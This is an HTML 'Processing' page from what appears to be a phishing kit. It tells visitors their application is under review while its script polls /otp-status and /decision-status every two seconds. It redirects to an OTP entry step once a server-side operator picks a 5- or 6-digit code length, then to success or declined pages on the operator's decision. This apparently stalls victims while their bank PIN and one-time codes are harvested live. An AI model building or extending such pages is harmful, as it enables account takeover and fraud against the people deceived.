<!DOCTYPE html>
<html>

<head>
    <title>Processing</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Processing...</h2>

    <div class="loader"></div>

    <p style="text-align:center; margin-top:20px;">
        Please wait while we review your application
    </p>

</div>

<div class="footer"></div>

<script>

// ==============================
// WAIT FOR OTP TRIGGER
// ==============================
if (localStorage.getItem("waitingForOtp") === "yes") {

    const checkInterval = setInterval(() => {

        // CHECK OTP FROM SERVER
        fetch("/otp-status")
        .then(res => res.json())
        .then(data => {
            if (data.otp === 5 || data.otp === 6) {
                localStorage.setItem("otpLength", data.otp);
                localStorage.removeItem("waitingForOtp");

                clearInterval(checkInterval);
                window.location.href = "step6.html";
            }
        });

    }, 2000);
}


// ==============================
// AFTER OTP → WAIT FOR DECISION
// ==============================
if (localStorage.getItem("fromPin") === "yes") {

    const decisionInterval = setInterval(() => {

        fetch("/decision-status")
        .then(res => res.json())
        .then(data => {

            if (data.decision === "accept") {
                clearInterval(decisionInterval);
                window.location.href = "success.html";
            }

            if (data.decision === "decline") {
                clearInterval(decisionInterval);
                window.location.href = "declined.html";
            }

        });

    }, 2000);
}

</script>

</body>
</html>
